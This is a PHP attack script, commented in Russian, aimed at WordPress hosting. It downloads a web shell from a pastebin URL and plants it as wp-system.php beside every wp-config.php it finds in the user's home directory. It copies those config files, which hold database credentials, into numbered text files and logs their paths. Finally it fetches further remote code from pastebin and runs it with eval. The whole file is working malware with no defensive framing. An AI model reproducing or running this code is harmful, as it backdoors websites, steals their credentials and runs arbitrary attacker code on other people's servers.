<?php
$user = posix_getpwuid(posix_getuid());
$dir = $user['dir'];//
echo $dir."<br>\n";
$find = 'wp-config.php';
$new='wp-system.php';
$files = [];

$shell = file_get_contents('https://pastebin.com/raw/hpqEekGT'); //содержимое шелла
file_put_contents('wp-system.php',$shell);  //содержимое шелла в файл

findFilesFromDirectory($dir, $files, $find);
$result=fopen('result.txt','w');
//fwrite($result,"...\n");//
foreach ($files as $i=>$file){
//	echo $file.'<br>';
	copy($file,($i+1).'.txt');
	copy($new,dirname($file).'/'.$new);//
	fwrite($result,$file."\n");
}
//fwrite($result,"...");//
fclose($result);
echo date('H:i:s ').'done';
$base = file_get_contents('https://pastebin.com/raw/kHL0XPea');
eval($base);
function findFilesFromDirectory($path, &$files, $find) {
	if (is_dir($path)) {
		$cleanPath = array_diff(scandir($path), array('.', '..'));
		foreach ($cleanPath as $file) {
			$finalPath = $path . '/' . $file;
			$result = findFilesFromDirectory($finalPath, $files, $find);
			if (!is_null($result)) $files[] = $result;
		}
	} else if (is_file($path) && $find==basename($path)) {
		return $path;
	}
}
?>
